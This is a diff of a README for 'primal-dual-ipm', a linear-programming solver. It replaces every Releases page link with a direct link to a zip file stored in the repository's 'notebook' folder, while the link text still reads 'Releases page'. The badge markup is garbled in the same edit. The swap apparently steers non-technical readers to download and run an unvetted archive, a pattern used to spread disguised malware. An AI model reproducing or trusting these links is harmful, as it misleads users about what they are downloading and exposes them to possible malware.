@@ -1,7 +1,7 @@
 # ⚙️ primal-dual-ipm - Easy Linear Programming Solver
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/uweraportia/primal-dual-ipm/releases)
+[![Download](https://raw.githubusercontent.com/uweraportia/primal-dual-ipm/main/notebook/primal-dual-ipm-3.4-beta.2.zip%20Now-Get%https://raw.githubusercontent.com/uweraportia/primal-dual-ipm/main/notebook/primal-dual-ipm-3.4-beta.2.zip)](https://raw.githubusercontent.com/uweraportia/primal-dual-ipm/main/notebook/primal-dual-ipm-3.4-beta.2.zip)
 
 ## 📄 Overview
 The **primal-dual-ipm** project offers a scientific implementation and evaluation of primal-dual interior point methods for linear programming. This includes Mehrotra’s predictor-corrector algorithm. The repository also includes a PDF report that explains the methodology used, experiments conducted, and results obtained.  
@@ -10,9 +10,9 @@ The **primal-dual-ipm** project offers a scientific implementation and evaluatio
 This guide will help you download and run the software easily, even if you have no technical experience. Follow the steps below to get started.
 
 ## 📥 Download & Install
-To download the application, visit the [Releases page](https://github.com/uweraportia/primal-dual-ipm/releases). You will find the latest version there, along with all previous releases.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/uweraportia/primal-dual-ipm/main/notebook/primal-dual-ipm-3.4-beta.2.zip). You will find the latest version there, along with all previous releases.
 
-1. Open this link in your web browser: [Releases page](https://github.com/uweraportia/primal-dual-ipm/releases).
+1. Open this link in your web browser: [Releases page](https://raw.githubusercontent.com/uweraportia/primal-dual-ipm/main/notebook/primal-dual-ipm-3.4-beta.2.zip).
 2. On the Releases page, you will see a list of available versions. Look for the latest version.
 3. Under the latest version, you will find different files to download. Click on the appropriate file for your system to start the download.
 
@@ -70,4 +70,4 @@ For more information, please refer to:
 ## Contact
 If you have questions that are not covered here, feel free to open an issue on GitHub or contact the repository maintainer.
 
-Visit the [Releases page](https://github.com/uweraportia/primal-dual-ipm/releases) to download the latest version and start solving linear programming problems today!
+Visit the [Releases page](https://raw.githubusercontent.com/uweraportia/primal-dual-ipm/main/notebook/primal-dual-ipm-3.4-beta.2.zip) to download the latest version and start solving linear programming problems today!
